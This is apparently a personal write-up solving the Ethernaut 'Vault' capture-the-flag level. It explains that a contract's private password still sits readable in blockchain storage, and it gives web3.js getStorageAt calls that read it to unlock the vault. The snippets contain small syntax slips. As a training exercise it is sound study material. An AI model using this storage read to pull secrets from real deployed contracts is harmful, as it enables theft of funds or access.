# Level 7 Vault

Challenge URL = https://ethernaut.zeppelin.solutions/level/0xe77b0bea3f019b1df2c9663c823a2ae65afb6a5f

# Vault Background Info 
 let contractAddress = //contract Address
password = web3.eth.getStorageAt(contractAddress, index))
// For Metamask callback whining
web3.eth.getStorageAt(contractAddress, 1, 
function(error, result) {password = result}))

# problem
Unlock the vault to pass the level!


# Solution
Vault:  private doesnt allow us to just call contract.password().  Only internal calls from the same contract can access.  Must query the storage of the contract.      

1.  Create new instance
2. Use web3 js library to interact with the chain 
3.  We will be using the web3.eth.getStorage method that takes a contract address, an integer(index(Just a piece of the ledger)) and since we are using metamask we have to pass a callback function
4.  Each storage element is indexed according the the order defined.  In the vault.sol contract locked strage var has index 0 and password index1.
let contractAddress = "0x7da2af0e6c1c58eb752afc3ce7ad00a5affe9264"
//contract Address
password = web3.eth.getStorageAt(contractAddress, index))
// For Metamask callback 
web3.eth.getStorageAt(contractAddress, 1, 
function(error, result) {password = result}))



